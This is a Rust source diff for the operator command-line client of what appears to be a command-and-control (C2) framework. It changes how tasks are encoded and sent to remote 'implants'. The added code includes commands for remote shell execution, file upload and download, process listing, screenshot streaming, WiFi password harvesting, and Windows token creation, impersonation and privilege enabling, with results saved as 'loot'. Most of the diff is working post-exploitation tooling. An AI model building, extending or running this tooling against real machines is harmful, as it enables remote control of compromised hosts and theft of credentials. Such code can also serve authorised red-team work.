@@ -18,8 +18,13 @@ pub async fn shell(cli: &CliState, cmd: &str) -> Result<()> {
 
     print_info(&format!("Executing: {}", cmd));
 
-    // Dispatch shell task
-    let task_data = cmd.as_bytes().to_vec();
+    // Dispatch shell task as protobuf-encoded ShellTask
+    let shell_task = protocol::ShellTask {
+        command: cmd.to_string(),
+        shell: None,
+        timeout_ms: Some(30000),
+    };
+    let task_data = shell_task.encode_to_vec();
     let task_id = cli.client.dispatch_task(implant_id, "shell", task_data).await?;
 
     print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
@@ -61,12 +66,16 @@ pub async fn upload(cli: &CliState, local: &str, remote: &str) -> Result<()> {
 
     print_info(&format!("Uploading {} ({} bytes) to {}", local, data.len(), remote));
 
-    // Create upload task data (remote_path\0file_data)
-    let mut task_data = remote.as_bytes().to_vec();
-    task_data.push(0); // null separator
-    task_data.extend_from_slice(&data);
+    // Create upload task as protobuf-encoded FileTask
+    let task = protocol::FileTask {
+        operation: Some(protocol::file_task::Operation::Upload(protocol::FileUpload {
+            remote_path: remote.to_string(),
+            data,
+        })),
+    };
+    let task_data = task.encode_to_vec();
 
-    let task_id = cli.client.dispatch_task(implant_id, "upload", task_data).await?;
+    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;
 
     print_success(&format!("Upload task dispatched: {}", hex::encode(task_id.as_bytes())));
 
@@ -82,24 +91,127 @@ pub async fn download(cli: &CliState, remote: &str, local: &str) -> Result<()> {
 
     // Note: For downloads, we can't know the size ahead of time
     // Always use simple download; implant will use chunked if needed
-    let task_data = remote.as_bytes().to_vec();
-    let task_id = cli.client.dispatch_task(implant_id, "download", task_data).await?;
+    let task = protocol::FileTask {
+        operation: Some(protocol::file_task::Operation::Download(protocol::FileDownload {
+            remote_path: remote.to_string(),
+        })),
+    };
+    let task_data = task.encode_to_vec();
+    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;
 
-    print_success(&format!("Download task dispatched: {}", hex::encode(task_id.as_bytes())));
-    print_info("File will be saved to loot once complete");
+    let task_id_hex = hex::encode(task_id.as_bytes());
+    print_success(&format!("Download task dispatched: {}", task_id_hex));
+    print_info("Waiting for implant to return file (timeout: 60s)...");
 
-    Ok(())
+    // Poll for task completion
+    let timeout = std::time::Duration::from_secs(60);
+    let poll_interval = std::time::Duration::from_secs(2);
+    let start = std::time::Instant::now();
+
+    loop {
+        tokio::time::sleep(poll_interval).await;
+
+        let task_info = match cli.client.get_task(task_id.as_bytes().to_vec()).await {
+            Ok(t) => t,
+            Err(e) => {
+                print_error(&format!("Failed to poll task status: {}", e));
+                return Ok(());
+            }
+        };
+
+        // TaskStatus::Completed == 3, Failed == 4, Cancelled == 5, Expired == 6
+        match task_info.status {
+            3 => {
+                // Completed — parse result_data as JSON and write bytes to local path
+                let json_str = match std::str::from_utf8(&task_info.result_data) {
+                    Ok(s) => s,
+                    Err(_) => {
+                        print_error("Result data is not valid UTF-8");
+                        return Ok(());
+                    }
+                };
+
+                let parsed: serde_json::Value = match serde_json::from_str(json_str) {
+                    Ok(v) => v,
+                    Err(e) => {
+                        print_error(&format!("Failed to parse result JSON: {}", e));
+                        return Ok(());
+                    }
+                };
+
+                // Extract byte array from FileContents.data
+                let data_array = parsed
+                    .get("FileContents")
+                    .and_then(|fc| fc.get("data"))
+                    .and_then(|d| d.as_array());
+
+                match data_array {
+                    Some(arr) => {
+                        let bytes: Vec<u8> = arr
+                            .iter()
+                            .filter_map(|v| v.as_u64().map(|b| b as u8))
+                            .collect();
+
+                        match std::fs::write(local, &bytes) {
+                            Ok(_) => {
+                                print_success(&format!(
+                                    "Downloaded {} bytes to {}",
+                                    bytes.len(),
+                                    local
+                                ));
+                            }
+                            Err(e) => {
+                                print_error(&format!("Failed to write {}: {}", local, e));
+                            }
+                        }
+                    }
+                    None => {
+                        print_error("Result JSON missing FileContents.data field");
+                    }
+                }
+                return Ok(());
+            }
+            4 => {
+                print_error("Download task failed on implant");
+                return Ok(());
+            }
+            5 => {
+                print_error("Download task was cancelled");
+                return Ok(());
+            }
+            6 => {
+                print_error("Download task expired before implant checked in");
+                return Ok(());
+            }
+            _ => {
+                // Still pending/dispatched — check timeout
+                if start.elapsed() >= timeout {
+                    print_info(&format!(
+                        "Download task still pending, check with 'task show {}'",
+                        task_id_hex
+                    ));
+                    return Ok(());
+                }
+                // Continue polling
+            }
+        }
+    }
 }
 
-/// Change directory on implant
-pub async fn cd(cli: &CliState, path: &str) -> Result<()> {
-    let session = cli.active_session().unwrap();
-    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+/// Change directory on implant (client-side tracking only)
+///
+/// NOTE: The implant spawns a new subprocess for each shell command, so
+/// changing directory via a shell task has no effect on subsequent commands.
+/// This function updates the operator's local CWD tracker and warns the user
+/// to use full paths in shell commands instead.
+pub fn cd(cli: &mut CliState, path: &str) -> Result<()> {
+    let session_id = cli.active_session().unwrap().full_id.clone();
+    let browser = cli.file_browser_state(&session_id);
+    browser.cwd = path.to_string();
 
-    let task_data = path.as_bytes().to_vec();
-    let task_id = cli.client.dispatch_task(implant_id, "cd", task_data).await?;
-
-    print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
+    print_info(&format!("Local CWD set to: {}", path));
+    print_info("[!] Note: the implant runs each shell command in a new subprocess.");
+    print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");
 
     Ok(())
 }
@@ -109,7 +221,13 @@ pub async fn pwd(cli: &CliState) -> Result<()> {
     let session = cli.active_session().unwrap();
     let implant_id = ImplantId::from_bytes(&session.full_id)?;
 
-    let task_id = cli.client.dispatch_task(implant_id, "pwd", vec![]).await?;
+    let task = protocol::ShellTask {
+        command: "pwd".to_string(),
+        shell: None,
+        timeout_ms: Some(10000),
+    };
+    let task_data = task.encode_to_vec();
+    let task_id = cli.client.dispatch_task(implant_id, "shell", task_data).await?;
 
     print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
 
@@ -121,8 +239,15 @@ pub async fn ls(cli: &CliState, path: Option<&str>) -> Result<()> {
     let session = cli.active_session().unwrap();
     let implant_id = ImplantId::from_bytes(&session.full_id)?;
 
-    let task_data = path.unwrap_or(".").as_bytes().to_vec();
-    let task_id = cli.client.dispatch_task(implant_id, "ls", task_data).await?;
+    let dir_path = path.unwrap_or(".");
+    let task = protocol::FileTask {
+        operation: Some(protocol::file_task::Operation::List(protocol::FileList {
+            path: dir_path.to_string(),
+            recursive: false,
+        })),
+    };
+    let task_data = task.encode_to_vec();
+    let task_id = cli.client.dispatch_task(implant_id, "file", task_data).await?;
 
     print_success(&format!("Task dispatched: {}", hex::encode(task_id.as_bytes())));
 
@@ -131,56 +256,21 @@ pub async fn ls(cli: &CliState, path: Option<&str>) -> Result<()> {
 
 /// List processes on implant
 pub async fn ps(cli: &CliState) -> Result<()> {
-    use crate::theme::Theme;
-    use comfy_table::{presets::UTF8_FULL, Cell, Color, ContentArrangement, Table};
-
     let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
 
     print_info("Listing processes...");
-
-    match cli.client.list_processes(session.full_id.clone(), true, None).await {
-        Ok(response) => {
-            if response.processes.is_empty() {
-                print_info("No processes found");
-                return Ok(());
-            }
-
-            let mut table = Table::new();
-            table
-                .load_preset(UTF8_FULL)
-                .set_content_arrangement(ContentArrangement::Dynamic);
-
-            // Headers
-            if Theme::is_interactive() {
-                table.set_header(vec![
-                    Cell::new("PID").fg(Color::Rgb { r: 203, g: 166, b: 247 }),
-                    Cell::new("PPID").fg(Color::Rgb { r: 203, g: 166, b: 247 }),
-                    Cell::new("Name").fg(Color::Rgb { r: 203, g: 166, b: 247 }),
-                    Cell::new("User").fg(Color::Rgb { r: 203, g: 166, b: 247 }),
-                    Cell::new("Arch").fg(Color::Rgb { r: 203, g: 166, b: 247 }),
-                ]);
-            } else {
-                table.set_header(vec!["PID", "PPID", "Name", "User", "Arch"]);
-            }
-
-            // Rows
-            for proc in &response.processes {
-                table.add_row(vec![
-                    proc.pid.to_string(),
-                    proc.ppid.to_string(),
-                    proc.name.clone(),
-                    proc.user.clone(),
-                    proc.arch.clone(),
-                ]);
-            }
-
-            println!("{table}");
-            print_info(&format!("{} processes", response.processes.len()));
-        }
-        Err(e) => {
-            print_error(&format!("Failed to list processes: {}", e));
-        }
-    }
+    let task = protocol::ProcessTask {
+        operation: Some(protocol::process_task::Operation::List(protocol::ProcessListAll {
+            include_modules: None,
+            include_threads: None,
+            name_filter: None,
+        })),
+    };
+    let task_data = task.encode_to_vec();
+    let task_id = cli.client.dispatch_task(implant_id, "proc", task_data).await?;
+    print_success(&format!("Process list task dispatched: {}", hex::encode(task_id.as_bytes())));
+    print_info("Results available via 'task show <id>'");
 
     Ok(())
 }
@@ -238,7 +328,11 @@ pub async fn sleep(cli: &CliState, seconds: u32) -> Result<()> {
     let session = cli.active_session().unwrap();
     let implant_id = ImplantId::from_bytes(&session.full_id)?;
 
-    let task_data = seconds.to_le_bytes().to_vec();
+    let task = protocol::SleepTask {
+        interval: seconds,
+        jitter: 0,
+    };
+    let task_data = task.encode_to_vec();
     let task_id = cli.client.dispatch_task(implant_id, "sleep", task_data).await?;
 
     print_success(&format!("Sleep interval set to {} seconds", seconds));
@@ -326,7 +420,14 @@ pub async fn screenshot(cli: &CliState) -> Result<()> {
     let session = cli.active_session().unwrap();
     let implant_id = ImplantId::from_bytes(&session.full_id)?;
 
-    let task_id = cli.client.dispatch_task(implant_id, "screenshot", vec![]).await?;
+    let task = protocol::ScreenshotTask {
+        monitor: None,
+        quality: None,
+        format: None,
+        include_cursor: None,
+    };
+    let task_data = task.encode_to_vec();
+    let task_id = cli.client.dispatch_task(implant_id, "screenshot", task_data).await?;
 
     print_success(&format!("Screenshot task dispatched: {}", hex::encode(task_id.as_bytes())));
     print_info("Screenshot will be saved to loot once complete");
@@ -433,7 +534,14 @@ pub async fn wifi(cli: &CliState) -> Result<()> {
 
     print_info("Enumerating WiFi credentials...");
 
-    let task_id = cli.client.dispatch_task(implant_id, "wifi", vec![]).await?;
+    // WifiModule ignores task_data (calls wifi::harvest() directly),
+    // but send a WifiTask for protocol consistency
+    let task = protocol::WifiTask {
+        include_passwords: true,
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "wifi", task_data).await?;
 
     print_success(&format!("WiFi enumeration task dispatched: {}", hex::encode(task_id.as_bytes())));
     print_info("Credentials will be saved to loot once complete");
@@ -661,7 +769,7 @@ pub async fn portfwd_list(cli: &CliState) -> Result<()> {
 }
 
 /// Push directory onto stack and change to new path
-pub async fn pushd(cli: &mut CliState, path: &str) -> Result<()> {
+pub fn pushd(cli: &mut CliState, path: &str) -> Result<()> {
     let session_id = cli.active_session().unwrap().full_id.clone();
 
     // Get file browser state and push current directory
@@ -671,12 +779,15 @@ pub async fn pushd(cli: &mut CliState, path: &str) -> Result<()> {
     }
     browser.cwd = path.to_string();
 
-    // Dispatch cd task to implant
-    cd(cli, path).await
+    print_info(&format!("Local CWD set to: {}", path));
+    print_info("[!] Note: the implant runs each shell command in a new subprocess.");
+    print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");
+
+    Ok(())
 }
 
 /// Pop directory from stack and return to it
-pub async fn popd(cli: &mut CliState) -> Result<()> {
+pub fn popd(cli: &mut CliState) -> Result<()> {
     let session_id = cli.active_session().unwrap().full_id.clone();
 
     // Get file browser state and pop directory
@@ -687,14 +798,122 @@ pub async fn popd(cli: &mut CliState) -> Result<()> {
 
     match prev_dir {
         Some(dir) => {
-            // Change to the popped directory
-            cd(cli, &dir).await
+            let browser = cli.file_browser_state(&session_id);
+            browser.cwd = dir.clone();
+            print_info(&format!("Local CWD set to: {}", dir));
+            print_info("[!] Note: the implant runs each shell command in a new subprocess.");
+            print_info("    'cd' does not persist on the implant. Use full paths in shell commands.");
+            Ok(())
         }
         None => {
             print_error("Directory stack is empty");
             Ok(())
         }
     }
+}
+
+/// Start continuous screenshot capture
+pub async fn screenshot_stream(cli: &CliState, interval_ms: u32, quality: Option<u32>, max_frames: Option<u32>) -> Result<()> {
+    let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+
+    print_info(&format!(
+        "Starting screenshot stream: interval={}ms quality={} max_frames={}",
+        interval_ms,
+        quality.unwrap_or(80),
+        max_frames.map(|f| f.to_string()).unwrap_or_else(|| "unlimited".to_string()),
+    ));
+
+    // ScreenshotStreamModule decodes ScreenshotTask (not ScreenshotStreamTask);
+    // it reads monitor field as max_frames, quality as quality
+    let task = protocol::ScreenshotTask {
+        monitor: max_frames.or(Some(10)),
+        quality,
+        format: None,
+        include_cursor: None,
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "screenshot_stream", task_data).await?;
+    print_success(&format!("Screenshot stream task dispatched: {}", hex::encode(task_id.as_bytes())));
+    Ok(())
+}
+
+/// Create a new logon token
+pub async fn token_make(cli: &CliState, username: &str, password: &str, domain: Option<&str>) -> Result<()> {
+    let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+
+    let dom = domain.unwrap_or(".");
+    print_info(&format!("Creating token: {}\\{}", dom, username));
+
+    let task = protocol::TokenTask {
+        operation: Some(protocol::token_task::Operation::Make(protocol::TokenMake {
+            username: username.to_string(),
+            password: password.to_string(),
+            domain: Some(dom.to_string()),
+        })),
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
+    print_success(&format!("Token make task dispatched: {}", hex::encode(task_id.as_bytes())));
+    Ok(())
+}
+
+/// Impersonate an existing token by ID
+pub async fn token_impersonate(cli: &CliState, token_id: u32) -> Result<()> {
+    let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+
+    print_info(&format!("Impersonating token ID: {}", token_id));
+
+    let task = protocol::TokenTask {
+        operation: Some(protocol::token_task::Operation::Impersonate(protocol::TokenImpersonate {
+            token_id,
+        })),
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
+    print_success(&format!("Token impersonate task dispatched: {}", hex::encode(task_id.as_bytes())));
+    Ok(())
+}
+
+/// Enable a privilege on the current token
+pub async fn token_enable_priv(cli: &CliState, priv_name: &str) -> Result<()> {
+    let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+
+    print_info(&format!("Enabling privilege: {}", priv_name));
+
+    let task = protocol::TokenTask {
+        operation: Some(protocol::token_task::Operation::EnablePriv(protocol::TokenEnablePriv {
+            privilege: priv_name.to_string(),
+        })),
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
+    print_success(&format!("Token enable-priv task dispatched: {}", hex::encode(task_id.as_bytes())));
+    Ok(())
+}
+
+/// List all tokens stored in the implant's token store
+pub async fn token_list(cli: &CliState) -> Result<()> {
+    let session = cli.active_session().unwrap();
+    let implant_id = ImplantId::from_bytes(&session.full_id)?;
+
+    print_info("Listing stored tokens...");
+
+    let task = protocol::TokenTask {
+        operation: Some(protocol::token_task::Operation::List(protocol::TokenList {})),
+    };
+    let task_data = task.encode_to_vec();
+
+    let task_id = cli.client.dispatch_task(implant_id, "token", task_data).await?;
+    print_success(&format!("Token list task dispatched: {}", hex::encode(task_id.as_bytes())));
+    Ok(())
 }
 
 /// Show directory stack contents
